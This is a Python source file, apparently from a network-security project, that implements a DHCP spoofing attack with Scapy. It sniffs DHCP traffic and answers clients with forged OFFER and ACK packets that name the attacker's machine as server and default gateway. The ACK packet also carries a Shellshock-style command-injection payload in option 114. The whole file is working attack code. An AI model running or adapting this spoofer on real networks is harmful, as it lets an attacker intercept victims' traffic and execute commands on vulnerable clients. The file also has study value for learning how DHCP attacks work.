# https://github.com/shamiul94/DHCP-Spoofing-Attack-Network-Security/blob/master/Final-Codes/dhcp_spoofer.py

import ipaddress
from Project import *

req_port = "any"
name = "DHCP Spoofing"
function_name = "spoofing"

# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):
    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else:
                    return i[1]
    except:
        pass


def make_dhcp_offer_packet(raw_mac, xid):
    packet = (Ether(src=source_mac, dst='ff:ff:ff:ff:ff:ff') /
              IP(src=fake_my_ip, dst='255.255.255.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
              DHCP(options=[("message-type", "offer"),
                            ('server_id', fake_server_ip),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', fake_router_ip),
                            ('lease_time', 192800),
                            ('renewal_time', 186400),
                            ('rebinding_time', 138240),
                            "end"]))

    return packet


def make_dhcp_ack_packet(raw_mac, xid, command):
    packet = (Ether(src=source_mac, dst='ff:ff:ff:ff:ff:ff') /
              IP(src=fake_my_ip, dst='255.255.255.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
              DHCP(options=[("message-type", "ack"),
                            ('server_id', fake_server_ip),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', fake_router_ip),
                            ('lease_time', 192800),
                            ('renewal_time', 186400),
                            ('rebinding_time', 138240),
                            (114, b"() { ignored;}; " + b"echo \'pwned\'"),
                            "end"]))

    return packet


def send_rogue_dhcp_offer_packet(packet):
    mac_addr = packet[Ether].src

    xid = packet[BOOTP].xid
    print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))

    print('XXXXXXXXXXXXXX Rogue OFFER packet on BUILD XXXXXXXXXXXXXX')

    new_packet = make_dhcp_offer_packet(mac_addr, xid)
    #print('New Packet data is:')
    #print(new_packet.show())
    print("\n[*] Sending Rogue OFFER...")
    sendp(new_packet)

    print('XXXXXXXXXXXXXXX  Rogue OFFER packet SENT XXXXXXXXXXXXXX')
    return


def send_rogue_dhcp_ACK_packet(packet):
    mac_addr = packet[Ether].src

    xid = packet[BOOTP].xid
    print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))

    print('XXXXXXXXXXXXXX Rogue ACK packet on BUILD XXXXXXXXXXXXXX')

    new_packet = make_dhcp_ack_packet(mac_addr, xid, command)

    #print('New Packet data is:')
    #print(new_packet.show())
    print("\n[*] Sending ACK...")
    #sendp(new_packet, iface=values.get("iface"))
    sendp(new_packet)
    print('XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX')

    return


def handle_dhcp_packet(packet):
    # print hexdump(packet)

    # Match DHCP discover
    if DHCP in packet and packet[DHCP].options[0][1] == 1:
        print(packet.command())
        print('---')
        print('New GOOD DHCP Discover')
        hostname = get_option(packet[DHCP].options, 'hostname')
        print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")

        # Sending rogue offer packet
        send_rogue_dhcp_offer_packet(packet)

    # Match DHCP offer
    elif DHCP in packet and packet[DHCP].options[0][1] == 2:
        print('---')
        print('New GOOD DHCP Offer')
        # print(packet.summary())
        # print(ls(packet))

        subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
        lease_time = get_option(packet[DHCP].options, 'lease_time')
        router = get_option(packet[DHCP].options, 'router')
        name_server = get_option(packet[DHCP].options, 'name_server')
        domain = get_option(packet[DHCP].options, 'domain')

        print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
              f"offered {packet[BOOTP].yiaddr}")

        print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
              f"{lease_time}, router: {router}, name_server: {name_server}, "
              f"domain: {domain}")

    # Match DHCP request
    elif DHCP in packet and packet[DHCP].options[0][1] == 3:
        print('---')
        print('New GOOD DHCP Request')
        # print(packet.summary())
        # print(ls(packet))

        requested_addr = get_option(packet[DHCP].options, 'requested_addr')
        hostname = get_option(packet[DHCP].options, 'hostname')
        print(f"Host {hostname} ({packet[Ether].src}) requested {requested_addr}")

        # sending rogue ack packet
        send_rogue_dhcp_ACK_packet(packet)

    # Match DHCP ack
    elif DHCP in packet and packet[DHCP].options[0][1] == 5:
        print('---')
        print('New GOOD DHCP Ack')
        # print(packet.summary())
        # print(ls(packet))

        subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
        lease_time = get_option(packet[DHCP].options, 'lease_time')
        router = get_option(packet[DHCP].options, 'router')
        name_server = get_option(packet[DHCP].options, 'name_server')

        print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
              f"acked {packet[BOOTP].yiaddr}")

        print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
              f"{lease_time}, router: {router}, name_server: {name_server}")

    # Match DHCP inform
    elif DHCP in packet and packet[DHCP].options[0][1] == 8:
        print('---')
        print('New GOOD DHCP Inform')
        # print(packet.summary())
        # print(ls(packet))

        hostname = get_option(packet[DHCP].options, 'hostname')
        vendor_class_id = get_option(packet[DHCP].options, 'vendor_class_id')

        print(f"DHCP Inform from {packet[IP].src} ({packet[Ether].src}) "
              f"hostname: {hostname}, vendor_class_id: {vendor_class_id}")

    else:
        print('---')
        print('Some Other DHCP Packet')
        # print(packet.summary())
        # print(ls(packet))

    # print('Packet data is:')
    # print(packet.show())

    return

def spoofing(values):
    global fake_my_ip
    global fake_your_ip
    global fake_server_ip
    global fake_router_ip
    global source_mac
    global command
    # IP to pretend to be
    fake_my_ip = ipaddress.ip_address(str(RandIP()))
    # need to set fake IP to give
    fake_your_ip = ipaddress.ip_address(fake_my_ip) + int(ipaddress.ip_address('0.0.0.1'))
    fake_server_ip = values.get("source_ip")
    fake_router_ip = values.get("source_ip")  # default gateway
    source_mac = values.get("source_mac_address")
    print(values.get("source_mac_address"))
    command = "echo 'pwned'"
    print("Waiting for DHCP request to spoof ACK and OFFER")
    sniff(iface=values.get("iface"), filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
